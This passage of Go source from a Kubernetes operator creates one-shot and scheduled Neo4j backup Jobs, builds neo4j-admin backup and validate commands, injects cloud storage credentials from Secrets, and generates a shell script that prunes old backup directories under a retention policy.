	// already exists or size is empty (user is referencing an external PVC).
	if err := r.ensureBackupPVC(ctx, backup); err != nil {
		return nil, fmt.Errorf("failed to create backup PVC: %w", err)
	}

	jobName := backup.Name + "-backup"
	logger := log.FromContext(ctx)

	backupCmd, err := r.buildBackupCommand(ctx, backup, cluster)
	if err != nil {
		return nil, fmt.Errorf("failed to build backup command: %w", err)
	}
	logger.Info("Running backup command", "cmd", backupCmd)

	image := fmt.Sprintf("%s:%s", cluster.Spec.Image.Repo, cluster.Spec.Image.Tag)
	backoffLimit := int32(3)

	labels := backupLabels(backup, "backup")
	job := &batchv1.Job{
		ObjectMeta: metav1.ObjectMeta{
			Name:      jobName,
			Namespace: backup.Namespace,
			Labels:    labels,
		},
		Spec: batchv1.JobSpec{
			TTLSecondsAfterFinished: func() *int32 { v := int32(300); return &v }(),
			BackoffLimit:            &backoffLimit,
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{Labels: labels},
				Spec: corev1.PodSpec{
					RestartPolicy:      corev1.RestartPolicyNever,
					ServiceAccountName: backupServiceAccountName,
					SecurityContext:    resources.DefaultNeo4jPodSecurityContext(),
					// Propagate the cluster's image pull secrets so backup
					// pods can pull the SAME Neo4j Enterprise image from
					// private registries — without this, a cluster running
					// fine on a private image fails its backups with
					// ImagePullBackOff because the backup namespace's default
					// SA has no creds.
					ImagePullSecrets: resources.ImagePullSecretsFromNames(cluster.Spec.Image.PullSecrets),
					Containers: []corev1.Container{
						{
							Name:            "backup",
							Image:           image,
							Command:         []string{"/bin/sh"},
							Args:            []string{"-c", backupCmd},
							Env:             append([]corev1.EnvVar{backupRunIDEnvVar()}, r.buildCloudEnvVars(backup)...),
							VolumeMounts:    r.buildVolumeMounts(backup),
							SecurityContext: resources.DefaultNeo4jContainerSecurityContext(),
							Resources:       resolveJobResources(backup.Spec.Options),
						},
					},
					Volumes: r.buildVolumes(backup),
				},
			},
		},
	}

	if err := controllerutil.SetControllerReference(backup, job, r.Scheme); err != nil {
		return nil, err
	}
	if err := r.Create(ctx, job); err != nil {
		return nil, err
	}
	return job, nil
}

func (r *Neo4jBackupReconciler) createBackupCronJob(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup, cluster *neo4jv1beta1.Neo4jEnterpriseCluster) (*batchv1.CronJob, error) {
	cronJobName := backup.Name + "-backup-cron"

	// Glob-safety check for sharded backups, runs once at CronJob create/update
	// time. Known limitation: a colliding database created AFTER the CronJob
	// already exists will be silently included in future scheduled runs until
	// the user touches the CR. Phase 1 accepts this gap; Phase 3 observability
	// can surface it via neo4j-admin backup validate output.
	if err := r.shardedPreflightGlobSafety(ctx, backup, cluster); err != nil {
		return nil, err
	}

	// Temp staging PVC, if configured, must exist before the first
	// scheduled run starts — otherwise the Pod hangs in
	// ContainerCreating with "MountVolume.SetUp failed: PVC not found".
	// The one-shot path already does this in createBackupJob; the
	// scheduled path was skipping it (recheck bug #4).
	if err := r.ensureTempStagingPVC(ctx, backup); err != nil {
		return nil, fmt.Errorf("failed to create temp staging PVC: %w", err)
	}
	// Same for the destination backup PVC — provision before the CronJob's
	// first scheduled run fires.
	if err := r.ensureBackupPVC(ctx, backup); err != nil {
		return nil, fmt.Errorf("failed to create backup PVC: %w", err)
	}

	backupCmd, err := r.buildBackupCommand(ctx, backup, cluster)
	if err != nil {
		return nil, fmt.Errorf("failed to build backup command: %w", err)
	}

	image := fmt.Sprintf("%s:%s", cluster.Spec.Image.Repo, cluster.Spec.Image.Tag)
	backoffLimit := int32(3)
	// Job TTL of 30 min (vs the legacy 5 min) gives reconcileScheduledHistory
	// time to record completed runs into status.history across modest
	// operator outages — without this, an operator restart during a
	// scheduled window would silently drop history entries (recheck bug #7).
	// Bounded above by spec.successfulJobsHistoryLimit so we still cap
	// long-term etcd footprint.
	jobTTL := int32(1800)
	// Skip any scheduled run missed by more than 60s — protects against
	// thundering-herd on operator/scheduler recovery, where K8s would
	// otherwise try to spawn every missed run at once (recheck bug #3).
	startingDeadline := int64(60)
	// SuccessfulJobsHistoryLimit defaults to 3; raise to 10 to match our
	// internal status.history cap so K8s doesn't GC Jobs before the
	// controller records them. FailedJobsHistoryLimit=3 keeps a small
	// post-mortem trail of failures.
	successHistory := int32(10)
	failedHistory := int32(3)

	cronJob := &batchv1.CronJob{
		ObjectMeta: metav1.ObjectMeta{
			Name:      cronJobName,
			Namespace: backup.Namespace,
		},
	}

	_, err = controllerutil.CreateOrUpdate(ctx, r.Client, cronJob, func() error {
		labels := backupLabels(backup, "backup-cron")
		cronJob.Labels = labels
		cronJob.Spec.Schedule = backup.Spec.Schedule
		// ConcurrencyPolicy=Forbid prevents a slow run from overlapping
		// with the next scheduled run — two concurrent neo4j-admin backup
		// invocations against the same cluster double the network/disk
		// load and risk Bolt connection limits (recheck bug #2). The
		// per-run-subfolder change in #129 fixed file collisions; this
		// fixes the upstream load.
		cronJob.Spec.ConcurrencyPolicy = batchv1.ForbidConcurrent
		cronJob.Spec.StartingDeadlineSeconds = &startingDeadline
		cronJob.Spec.SuccessfulJobsHistoryLimit = &successHistory
		cronJob.Spec.FailedJobsHistoryLimit = &failedHistory
		cronJob.Spec.JobTemplate = batchv1.JobTemplateSpec{
			ObjectMeta: metav1.ObjectMeta{Labels: labels},
			Spec: batchv1.JobSpec{
				TTLSecondsAfterFinished: &jobTTL,
				BackoffLimit:            &backoffLimit,
				Template: corev1.PodTemplateSpec{
					ObjectMeta: metav1.ObjectMeta{Labels: labels},
					Spec: corev1.PodSpec{
						RestartPolicy:      corev1.RestartPolicyNever,
						ServiceAccountName: backupServiceAccountName,
						SecurityContext:    resources.DefaultNeo4jPodSecurityContext(),
						// Same rationale as createBackupJob — scheduled
						// backups need the same pull secrets as the cluster
						// they're backing up.
						ImagePullSecrets: resources.ImagePullSecretsFromNames(cluster.Spec.Image.PullSecrets),
						Containers: []corev1.Container{
							{
								Name:            "backup",
								Image:           image,
								Command:         []string{"/bin/sh"},
								Args:            []string{"-c", backupCmd},
								Env:             append([]corev1.EnvVar{backupRunIDEnvVar()}, r.buildCloudEnvVars(backup)...),
								VolumeMounts:    r.buildVolumeMounts(backup),
								SecurityContext: resources.DefaultNeo4jContainerSecurityContext(),
								Resources:       resolveJobResources(backup.Spec.Options),
							},
						},
						Volumes: r.buildVolumes(backup),
					},
				},
			},
		}
		return controllerutil.SetControllerReference(backup, cronJob, r.Scheme)
	})
	if err != nil {
		return nil, err
	}
	return cronJob, nil
}

// effectiveRemoteAddressResolution resolves Spec.Options.RemoteAddressResolution
// to its effective bool value with defaulting applied. Explicit user values
// (true or false) always win. When the field is unset (nil) AND target.Kind is
// ShardedDatabase AND the Neo4j version supports the flag (2025.09+), default
// to true — matches the canonical upstream sharded-backup invocation.
func effectiveRemoteAddressResolution(backup *neo4jv1beta1.Neo4jBackup, version *neo4j.Version) bool {
	if backup.Spec.Options != nil && backup.Spec.Options.RemoteAddressResolution != nil {
		return *backup.Spec.Options.RemoteAddressResolution
	}
	return backup.Spec.Target.Kind == neo4jv1beta1.BackupTargetKindShardedDatabase &&
		version != nil && version.SupportsRemoteAddressResolution()
}

func (r *Neo4jBackupReconciler) buildBackupCommand(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup, cluster *neo4jv1beta1.Neo4jEnterpriseCluster) (string, error) {
	imageTag := fmt.Sprintf("%s:%s", cluster.Spec.Image.Repo, cluster.Spec.Image.Tag)
	version, err := neo4j.GetImageVersion(imageTag)
	if err != nil {
		// Silent fallback used to mask exotic / misconfigured image tags —
		// version-gated flags (--parallel-download, --prefer-diff-as-parent,
		// --remote-address-resolution) would then silently degrade to the
		// 5.26 defaults with no signal to the operator. Log the fallback so
		// the diagnostic is visible without forcing the backup to fail.
		log.FromContext(ctx).Info("Failed to parse Neo4j image version, falling back to 5.26.0 defaults",
			"imageTag", imageTag,
			"error", err.Error(),
			"clusterName", cluster.Name)
		version = &neo4j.Version{Major: 5, Minor: 26, Patch: 0}
	}

	// Resolve --remote-address-resolution with defaulting applied. For
	// ShardedDatabase backups on Neo4j 2025.09+ the upstream canonical
	// invocation includes this flag; the operator defaults it to true when
	// the user hasn't set the field explicitly. Explicit values (true/false)
	// always win.
	remoteAddrRes := effectiveRemoteAddressResolution(backup, version)

	// Validate version-gated flags individually.
	if backup.Spec.Options != nil {
		if backup.Spec.Options.ParallelDownload && !version.SupportsParallelDownload() {
			return "", fmt.Errorf("--parallel-download requires CalVer 2025.11+ (image: %s)", cluster.Spec.Image.Tag)
		}
		if remoteAddrRes && !version.SupportsRemoteAddressResolution() {
			return "", fmt.Errorf("--remote-address-resolution requires CalVer 2025.09+ (image: %s)", cluster.Spec.Image.Tag)
		}
		if backup.Spec.Options.SkipRecovery && !version.SupportsSkipRecovery() {
			return "", fmt.Errorf("--skip-recovery requires CalVer 2025.11+ (image: %s)", cluster.Spec.Image.Tag)
		}
		if backup.Spec.Options.PreferDiffAsParent && !version.SupportsPreferDiffAsParent() {
			return "", fmt.Errorf("--prefer-diff-as-parent requires CalVer 2025.04+ (image: %s)", cluster.Spec.Image.Tag)
		}
	}

	// All runs for one Neo4jBackup CR share a single --to-path directory
	// (NOT per-run subfolders). This is what neo4j-admin expects for
	// `--type=DIFF` chaining — diff backups read the prior FULL artifact
	// from the same directory to compute the delta. Per-run isolation is
	// preserved at the FILENAME level: neo4j-admin embeds a timestamp in
	// each artifact, and our F3 Pod-log parser captures it into
	// BackupRun.ArtifactFilename / ShardArtifacts.Filename so restores
	// can pin a specific run when needed. Trailing slash matters for
	// cloud targets: neo4j-admin rejects "s3://bucket/path" with "The
	// path … is not a directory - please add a terminal '/' to your
	// path". Harmless for PVC targets — the local filesystem treats
	// both forms identically.
	toPath := r.buildToPath(backup) + "/"
	// The --from FQDN differs between cluster and standalone targets;
	// resolve the type from the live API so the FQDN matches reality.
	// Falls back to the cluster shape on any lookup error so the
	// existing cluster-backup path remains the no-op default.
	fromAddresses := resources.BuildBackupFromAddresses(cluster)
	if isStandalone, standalone, lookupErr := r.isStandaloneTarget(ctx, backup); lookupErr == nil && isStandalone && standalone != nil {
		fromAddresses = resources.BuildStandaloneBackupFromAddress(standalone)
	}
	allDatabases := backup.Spec.Target.Kind == neo4jv1beta1.BackupTargetKindCluster
	dbName := ""
	switch backup.Spec.Target.Kind {
	case neo4jv1beta1.BackupTargetKindDatabase:
		dbName = backup.Spec.Target.Name
	case neo4jv1beta1.BackupTargetKindShardedDatabase:
		// Property-sharded DBs are backed up as a glob across all shards:
		// {name}-g000 (graph) + {name}-p000…p{N-1} (property shards). The
		// argument is wrapped in single quotes by GetBackupCommand so the
		// shell doesn't expand "*" before reaching neo4j-admin.
		dbName = backup.Spec.Target.Name + "*"
	}

	cmd := neo4j.GetBackupCommand(version, dbName, toPath, allDatabases, fromAddresses)

	if backup.Spec.Options != nil {
		if backup.Spec.Options.BackupType != "" {
			cmd += " --type=" + backup.Spec.Options.BackupType
		}
		if !backup.Spec.Options.Compress {
			cmd += " --compress=false"
		}
		if backup.Spec.Options.PageCache != "" {
			cmd += " --pagecache=" + backup.Spec.Options.PageCache
		}
		if backup.Spec.Options.TempPath != "" {
			cmd += " --temp-path=" + backup.Spec.Options.TempPath
		} else if backup.Spec.Options.TempStorage != nil {
			cmd += " --temp-path=/tmp/neo4j-staging"
		}
		if backup.Spec.Options.PreferDiffAsParent {
			cmd += " --prefer-diff-as-parent"
		}
		if backup.Spec.Options.ParallelDownload {
			cmd += " --parallel-download=true"
		}
		if backup.Spec.Options.SkipRecovery {
			cmd += " --skip-recovery=true"
		}
		if backup.Spec.Options.ParallelRecovery {
			cmd += " --parallel-recovery=true"
		}
		if backup.Spec.Options.KeepFailed {
			cmd += " --keep-failed=true"
		}
		if backup.Spec.Options.IncludeMetadata != "" && version.SupportsMetadataOption() {
			cmd += " --include-metadata=" + backup.Spec.Options.IncludeMetadata
		}
		for _, arg := range backup.Spec.Options.AdditionalArgs {
			cmd += " " + shellQuote(arg)
		}
	}

	// --remote-address-resolution is emitted OUTSIDE the Options-nil guard
	// because its effective value can be true even when the user did not set
	// Spec.Options at all: the ShardedDatabase + 2025.09+ default fires for
	// any backup whose target.kind is sharded, regardless of whether other
	// BackupOptions fields were touched. Gating this on Options != nil would
	// silently swallow the default for users who only set spec.target +
	// spec.storage. Pinned at the unit-test layer by
	// TestEffectiveRemoteAddressResolution and at the integration-test layer
	// by TestPropertyShardingBackup_HappyPath.
	if remoteAddrRes {
		cmd += " --remote-address-resolution=true"
	}

	// F4: opt-in `neo4j-admin backup validate` step. Chained with `|| true`
	// so a validate failure doesn't fail the Job — the backup itself
	// succeeded, validate is informational. The operator parses the
	// stdout into BackupRun.Validation after the Job completes (see the
	// post-Job hook in recordOneShotBackupRun / reconcileScheduledHistory).
	//
	// **Sharded validate takes the LITERAL DB name, not the backup-side glob**:
	// per the sharded admin-operations docs, `neo4j-admin backup validate
	// --database="foo"` auto-discovers and validates every shard (foo-g000,
	// foo-p000, …) under the parent name. Passing the `foo*` glob (which
	// the backup command needs to capture all shards in one invocation)
	// makes validate try to evaluate `foo*-g000` literally and emit
	//   "Unable to find valid backup chain for database 'foo*-g000'"
	// — unparseable. Strip the trailing `*` here so validate sees the
	// canonical parent name.
	if backup.Spec.Options != nil && backup.Spec.Options.Validate != nil && *backup.Spec.Options.Validate {
		validateDBArg := dbName
		if allDatabases {
			validateDBArg = "*"
		} else {
			validateDBArg = strings.TrimSuffix(validateDBArg, "*")
		}
		cmd += fmt.Sprintf(` && (neo4j-admin backup validate --from-path=%s --database="%s" || true)`, toPath, validateDBArg)
	}

	if backup.Spec.Storage.Type == "pvc" {
		cmd = fmt.Sprintf("mkdir -p %s && %s", toPath, cmd)
	}

	return cmd, nil
}

// buildToPath returns the --to-path value passed to neo4j-admin. All runs
// of a single Neo4jBackup CR share this directory — it's how neo4j-admin
// chains `--type=DIFF` backups off the prior FULL. Per-run identity is
// preserved via the timestamp neo4j-admin embeds in each artifact
// filename; F3 Pod-log parsing captures that into
// BackupRun.ArtifactFilename / ShardArtifacts.Filename so restores can
// pin a specific run.
//
// The path embeds a per-chain segment (`<base>/<chain-root>/`). The
// chain root is `spec.chainFromBackup` if set (so e.g. a daily-DIFF CR
// can chain into a daily-FULL CR's directory), otherwise the CR's own
// name. This is what supports mixed-cadence FULL+DIFF workflows: two
// CRs intentionally sharing one directory via the chainFromBackup link.
// Two unrelated CRs still stay isolated because they each get their own
// chain-root segment.
func (r *Neo4jBackupReconciler) buildToPath(backup *neo4jv1beta1.Neo4jBackup) string {
	st := backup.Spec.Storage
	p := st.Path
	if p == "" {
		p = "backups"
	}
	crSegment := chainRoot(backup)
	switch st.Type {
	case "s3":
		return fmt.Sprintf("s3://%s/%s/%s", st.Bucket, p, crSegment)
	case "gcs":
		return fmt.Sprintf("gs://%s/%s/%s", st.Bucket, p, crSegment)
	case "azure":
		return fmt.Sprintf("azb://%s/%s/%s", st.Bucket, p, crSegment)
	default: // pvc
		return fmt.Sprintf("/backup/%s", crSegment)
	}
}

// defaultJobResources is the Burstable default applied to backup and
// restore Job containers when the user doesn't supply
// `spec.options.resources`. Memory floor (512Mi request) keeps the pod
// out of BestEffort QoS so the kernel OOM-killer doesn't pick it under
// node pressure; ceiling (2Gi limit) is generous for empty/small DBs
// and CI-friendly (GitHub-hosted runner ~5Gi usable). Production users
// with hundreds-of-GB databases should override via spec.options.resources.
func defaultJobResources() corev1.ResourceRequirements {
	return corev1.ResourceRequirements{
		Requests: corev1.ResourceList{
			corev1.ResourceCPU:    resource.MustParse("100m"),
			corev1.ResourceMemory: resource.MustParse("512Mi"),
		},
		Limits: corev1.ResourceList{
			corev1.ResourceCPU:    resource.MustParse("1000m"),
			corev1.ResourceMemory: resource.MustParse("2Gi"),
		},
	}
}

// resolveJobResources returns the user-supplied resources from
// spec.options.resources, falling back to defaultJobResources().
func resolveJobResources(opt *neo4jv1beta1.BackupOptions) corev1.ResourceRequirements {
	if opt != nil && opt.Resources != nil {
		return *opt.Resources
	}
	return defaultJobResources()
}

// resolveRestoreJobResources is the Neo4jRestore equivalent of
// resolveJobResources. Same default policy.
func resolveRestoreJobResources(opt *neo4jv1beta1.RestoreOptionsSpec) corev1.ResourceRequirements {
	if opt != nil && opt.Resources != nil {
		return *opt.Resources
	}
	return defaultJobResources()
}

// chainRoot returns the directory segment under spec.storage.path that
// this backup writes into: the value of spec.chainFromBackup when set
// (the parent CR's name), otherwise the CR's own name.
//
// All chained CRs of one chain return the same root, so they share a
// `--to-path` directory and `neo4j-admin` can resolve the
// full/diff chain across them at backup and restore time.
func chainRoot(backup *neo4jv1beta1.Neo4jBackup) string {
	if backup.Spec.ChainFromBackup != "" {
		return backup.Spec.ChainFromBackup
	}
	return backup.Name
}

// backupRunIDEnvVar exposes the backing Job's name to the backup Pod as
// BACKUP_RUN_ID via the downward API. The value is retained for log
// correlation (operator logs reference the Job name; Pod logs surface
// the same name) and for status.history.BackupsPath audit reference,
// even though --to-path no longer appends it as a subfolder (runs now
// share a directory so neo4j-admin can chain `--type=DIFF` backups).
//
// For one-shot Neo4jBackup CRs the value is "<backup>-backup". For
// CronJob-spawned scheduled runs Kubernetes names each child Job
// "<cronjob>-<unix-seconds>", which is sortable and unique per scheduled
// time. The label key `batch.kubernetes.io/job-name` is the canonical
// Kubernetes 1.27+ form and is always populated on Pods spawned by Jobs.
func backupRunIDEnvVar() corev1.EnvVar {
	return corev1.EnvVar{
		Name: "BACKUP_RUN_ID",
		ValueFrom: &corev1.EnvVarSource{
			FieldRef: &corev1.ObjectFieldSelector{
				FieldPath: "metadata.labels['batch.kubernetes.io/job-name']",
			},
		},
	}
}

// cloudBlockForBackup returns the CloudBlock from whichever spec field is populated.
func cloudBlockForBackup(backup *neo4jv1beta1.Neo4jBackup) *neo4jv1beta1.CloudBlock {
	if backup.Spec.Storage.Cloud != nil {
		return backup.Spec.Storage.Cloud
	}
	return backup.Spec.Cloud
}

// buildCloudEnvVars injects cloud provider credentials from a Kubernetes Secret
// into the backup job container as environment variables.
// When CredentialsSecretRef is empty the function returns nil, which means the
// Job relies on ambient cloud identity (IRSA, GKE Workload Identity, etc.).
func (r *Neo4jBackupReconciler) buildCloudEnvVars(backup *neo4jv1beta1.Neo4jBackup) []corev1.EnvVar {
	cloud := cloudBlockForBackup(backup)
	if cloud == nil || cloud.CredentialsSecretRef == "" {
		return nil
	}
	ref := cloud.CredentialsSecretRef
	fromSecret := func(key string) *corev1.EnvVarSource {
		return &corev1.EnvVarSource{SecretKeyRef: &corev1.SecretKeySelector{
			LocalObjectReference: corev1.LocalObjectReference{Name: ref}, Key: key,
		}}
	}
	switch cloud.Provider {
	case "aws":
		envVars := []corev1.EnvVar{
			{Name: "AWS_ACCESS_KEY_ID", ValueFrom: fromSecret("AWS_ACCESS_KEY_ID")},
			{Name: "AWS_SECRET_ACCESS_KEY", ValueFrom: fromSecret("AWS_SECRET_ACCESS_KEY")},
			{Name: "AWS_REGION", ValueFrom: fromSecret("AWS_REGION")},
		}
		// S3-compatible endpoint (MinIO, Ceph RGW, Cloudflare R2, etc.).
		// AWS SDK v2 reads AWS_ENDPOINT_URL_S3 as the S3-specific endpoint override.
		if cloud.EndpointURL != "" {
			envVars = append(envVars, corev1.EnvVar{
				Name:  "AWS_ENDPOINT_URL_S3",
				Value: cloud.EndpointURL,
			})
		}
		// Path-style addressing is required for MinIO and most self-hosted stores.
		// neo4j-admin runs as a JVM process; JAVA_TOOL_OPTIONS is read by the JVM
		// before main() so this system property reaches the AWS SDK reliably.
		if cloud.ForcePathStyle {
			envVars = append(envVars, corev1.EnvVar{
				Name:  "JAVA_TOOL_OPTIONS",
				Value: "-Daws.s3.forcePathStyle=true",
			})
		}
		return envVars
	case "azure":
		return []corev1.EnvVar{
			{Name: "AZURE_STORAGE_ACCOUNT", ValueFrom: fromSecret("AZURE_STORAGE_ACCOUNT")},
			{Name: "AZURE_STORAGE_KEY", ValueFrom: fromSecret("AZURE_STORAGE_KEY")},
		}
	case "gcp":
		// The credentials JSON is mounted as a file; point the SDK at it.
		return []corev1.EnvVar{
			{Name: "GOOGLE_APPLICATION_CREDENTIALS", Value: "/var/secrets/gcp/credentials.json"},
		}
	}
	return nil
}

func (r *Neo4jBackupReconciler) buildVolumeMounts(backup *neo4jv1beta1.Neo4jBackup) []corev1.VolumeMount {
	mounts := []corev1.VolumeMount{
		{Name: "backup-storage", MountPath: "/backup"},
	}

	// GCP explicit credentials: mount the Secret containing the service-account JSON.
	cloud := cloudBlockForBackup(backup)
	if cloud != nil && cloud.Provider == "gcp" && cloud.CredentialsSecretRef != "" {
		mounts = append(mounts, corev1.VolumeMount{
			Name:      "gcp-credentials",
			MountPath: "/var/secrets/gcp",
			ReadOnly:  true,
		})
	}

	// Temp storage PVC for cloud backup staging
	if backup.Spec.Options != nil && backup.Spec.Options.TempStorage != nil {
		mounts = append(mounts, corev1.VolumeMount{
			Name:      "temp-staging",
			MountPath: "/tmp/neo4j-staging",
		})
	}

	return mounts
}

func (r *Neo4jBackupReconciler) buildVolumes(backup *neo4jv1beta1.Neo4jBackup) []corev1.Volume {
	volumes := []corev1.Volume{}

	// Backup storage volume.
	if backup.Spec.Storage.Type == "pvc" && backup.Spec.Storage.PVC != nil && backup.Spec.Storage.PVC.Name != "" {
		volumes = append(volumes, corev1.Volume{
			Name: "backup-storage",
			VolumeSource: corev1.VolumeSource{
				PersistentVolumeClaim: &corev1.PersistentVolumeClaimVolumeSource{
					ClaimName: backup.Spec.Storage.PVC.Name,
				},
			},
		})
	} else {
		volumes = append(volumes, corev1.Volume{
			Name:         "backup-storage",
			VolumeSource: corev1.VolumeSource{EmptyDir: &corev1.EmptyDirVolumeSource{}},
		})
	}

	// GCP explicit credentials: project the JSON key from the Secret onto a known path.
	// The key inside the Secret must be named GOOGLE_APPLICATION_CREDENTIALS_JSON.
	cloud := cloudBlockForBackup(backup)
	if cloud != nil && cloud.Provider == "gcp" && cloud.CredentialsSecretRef != "" {
		volumes = append(volumes, corev1.Volume{
			Name: "gcp-credentials",
			VolumeSource: corev1.VolumeSource{
				Secret: &corev1.SecretVolumeSource{
					SecretName: cloud.CredentialsSecretRef,
					Items: []corev1.KeyToPath{
						{
							Key:  "GOOGLE_APPLICATION_CREDENTIALS_JSON",
							Path: "credentials.json",
						},
					},
				},
			},
		})
	}

	// Temp staging PVC for cloud operations (created by ensureTempStagingPVC)
	if backup.Spec.Options != nil && backup.Spec.Options.TempStorage != nil {
		volumes = append(volumes, corev1.Volume{
			Name: "temp-staging",
			VolumeSource: corev1.VolumeSource{
				PersistentVolumeClaim: &corev1.PersistentVolumeClaimVolumeSource{
					ClaimName: backup.Name + "-temp-staging",
				},
			},
		})
	}

	return volumes
}

func (r *Neo4jBackupReconciler) getTargetCluster(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup) (*neo4jv1beta1.Neo4jEnterpriseCluster, error) {
	targetNamespace := backup.Spec.Target.Namespace
	if targetNamespace == "" {
		targetNamespace = backup.Namespace
	}

	// For database-scoped kinds the Name is the database name; use ClusterRef for the cluster.
	clusterName := backup.Spec.Target.Name
	if neo4jv1beta1.IsDatabaseScopedBackupKind(backup.Spec.Target.Kind) {
		if backup.Spec.Target.ClusterRef == "" {
			return nil, fmt.Errorf("clusterRef must be set when backup target Kind is %s", backup.Spec.Target.Kind)
		}
		clusterName = backup.Spec.Target.ClusterRef
	}

	// Try Neo4jEnterpriseCluster first.
	cluster := &neo4jv1beta1.Neo4jEnterpriseCluster{}
	if err := r.Get(ctx, types.NamespacedName{Name: clusterName, Namespace: targetNamespace}, cluster); err == nil {
		return cluster, nil
	}

	// Fall back to Neo4jEnterpriseStandalone.
	standalone := &neo4jv1beta1.Neo4jEnterpriseStandalone{}
	if err := r.Get(ctx, types.NamespacedName{Name: clusterName, Namespace: targetNamespace}, standalone); err != nil {
		return nil, fmt.Errorf("target %q not found as Neo4jEnterpriseCluster or Neo4jEnterpriseStandalone in namespace %q", clusterName, targetNamespace)
	}
	return standaloneAsCluster(standalone), nil
}

// isStandaloneTarget reports whether the backup target points at a
// Neo4jEnterpriseStandalone rather than a Neo4jEnterpriseCluster. The
// address builders differ — cluster pods are named {name}-server-N,
// standalone pods are {name}-0 — so this branch happens before
// constructing the --from FQDN.
func (r *Neo4jBackupReconciler) isStandaloneTarget(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup) (bool, *neo4jv1beta1.Neo4jEnterpriseStandalone, error) {
	targetNamespace := backup.Spec.Target.Namespace
	if targetNamespace == "" {
		targetNamespace = backup.Namespace
	}
	name := backup.Spec.Target.Name
	if neo4jv1beta1.IsDatabaseScopedBackupKind(backup.Spec.Target.Kind) {
		name = backup.Spec.Target.ClusterRef
	}
	// Cluster CR wins if both exist (defensive; name collisions are rare).
	cluster := &neo4jv1beta1.Neo4jEnterpriseCluster{}
	if err := r.Get(ctx, types.NamespacedName{Name: name, Namespace: targetNamespace}, cluster); err == nil {
		return false, nil, nil
	}
	standalone := &neo4jv1beta1.Neo4jEnterpriseStandalone{}
	if err := r.Get(ctx, types.NamespacedName{Name: name, Namespace: targetNamespace}, standalone); err == nil {
		return true, standalone, nil
	}
	return false, nil, fmt.Errorf("target %q not found in namespace %q", name, targetNamespace)
}

func (r *Neo4jBackupReconciler) isClusterReady(cluster *neo4jv1beta1.Neo4jEnterpriseCluster) bool {
	return cluster.Status.Phase == "Ready"
}

func (r *Neo4jBackupReconciler) cleanupBackupJobs(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup) error {
	// Delete associated jobs
	jobList := &batchv1.JobList{}
	if err := r.List(ctx, jobList, client.InNamespace(backup.Namespace), client.MatchingLabels{
		"app.kubernetes.io/instance":  backup.Name,
		"app.kubernetes.io/component": "backup",
	}); err != nil {
		return err
	}

	for _, job := range jobList.Items {
		if err := r.Delete(ctx, &job); err != nil && !errors.IsNotFound(err) {
			return err
		}
	}

	// Delete associated CronJobs
	cronJobList := &batchv1.CronJobList{}
	if err := r.List(ctx, cronJobList, client.InNamespace(backup.Namespace), client.MatchingLabels{
		"app.kubernetes.io/instance":  backup.Name,
		"app.kubernetes.io/component": "backup-cron",
	}); err != nil {
		return err
	}

	for _, cronJob := range cronJobList.Items {
		if err := r.Delete(ctx, &cronJob); err != nil && !errors.IsNotFound(err) {
			return err
		}
	}

	return nil
}

func (r *Neo4jBackupReconciler) cleanupBackupArtifacts(ctx context.Context, backup *neo4jv1beta1.Neo4jBackup) error {
	logger := log.FromContext(ctx)

	if backup.Spec.Retention == nil {
		return nil
	}

	// Cloud storage: retention is handled by bucket lifecycle rules.
	switch backup.Spec.Storage.Type {
	case "s3", "gcs", "azure":
		logger.Info("Cloud storage retention should be configured via bucket lifecycle rules — no cleanup Job created",
			"backup", backup.Name, "storageType", backup.Spec.Storage.Type)
		return nil
	}

	// PVC storage: create a cleanup Job using alpine.
	script := buildRetentionScript(backup.Spec.Retention)
	cleanupJobName := fmt.Sprintf("%s-cleanup-%d", backup.Name, time.Now().Unix())
	backoffLimit := int32(1)

	cleanupLabels := backupLabels(backup, "cleanup")
	cleanupJob := &batchv1.Job{
		ObjectMeta: metav1.ObjectMeta{
			Name:      cleanupJobName,
			Namespace: backup.Namespace,
			Labels:    cleanupLabels,
		},
		Spec: batchv1.JobSpec{
			TTLSecondsAfterFinished: func() *int32 { v := int32(300); return &v }(),
			BackoffLimit:            &backoffLimit,
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{Labels: cleanupLabels},
				Spec: corev1.PodSpec{
					RestartPolicy: corev1.RestartPolicyNever,
					Containers: []corev1.Container{
						{
							Name: "backup-cleanup",
							// Pinned tag (not :latest) for reproducible
							// rebuilds — :latest resolves to a different
							// digest over time and can silently change pod
							// behaviour across operator reconciles.
							Image:   "alpine:3.20",
							Command: []string{"/bin/sh"},
							Args:    []string{"-c", script},
							VolumeMounts: []corev1.VolumeMount{
								{Name: "backup-storage", MountPath: "/backup"},
							},
						},
					},
					Volumes: r.buildVolumes(backup),
				},
			},
		},
	}

	if err := controllerutil.SetControllerReference(backup, cleanupJob, r.Scheme); err != nil {
		return err
	}
	if err := r.Create(ctx, cleanupJob); err != nil {
		return fmt.Errorf("failed to create cleanup job: %w", err)
	}

	logger.Info("Backup cleanup job created", "job", cleanupJob.Name)
	return nil
}

// buildRetentionScript generates a shell script that enforces the given retention
// policy against directories under /backup.
func buildRetentionScript(policy *neo4jv1beta1.RetentionPolicy) string {
	script := `#!/bin/sh
set -e
BACKUP_DIR="/backup"
echo "Backup retention enforcement in $BACKUP_DIR"
`

	if policy.MaxCount > 0 {
		script += fmt.Sprintf(`
MAX_COUNT=%d
FILE_COUNT=$(find "$BACKUP_DIR" -maxdepth 1 -mindepth 1 -type d | wc -l)
echo "Found $FILE_COUNT backup directories"
if [ "$FILE_COUNT" -gt "$MAX_COUNT" ]; then
    TO_DELETE=$((FILE_COUNT - MAX_COUNT))
    echo "Deleting $TO_DELETE oldest backups (keeping $MAX_COUNT)"
    # Sort by filesystem mtime, not by directory name. The directory name
    # happens to encode a YYYYMMDD-HHMMSS timestamp today, but coupling
    # retention's "oldest first" semantics to that naming convention is
    # fragile — anyone who renames the timestamp format silently breaks
    # retention. GNU find's -printf is available because the backup
    # container is Linux-only.
    find "$BACKUP_DIR" -maxdepth 1 -mindepth 1 -type d -printf '%%T@ %%p\n' | \
        sort -n | \
        head -n "$TO_DELETE" | \
        cut -d' ' -f2- | \
        xargs -r rm -rf
    echo "Deleted $TO_DELETE old backup directories"
fi
`, policy.MaxCount)
	}

	if policy.MaxAge != "" {
		findArg := parseFindTimeArg(policy.MaxAge)
		script += fmt.Sprintf(`
# Delete backup directories older than %s
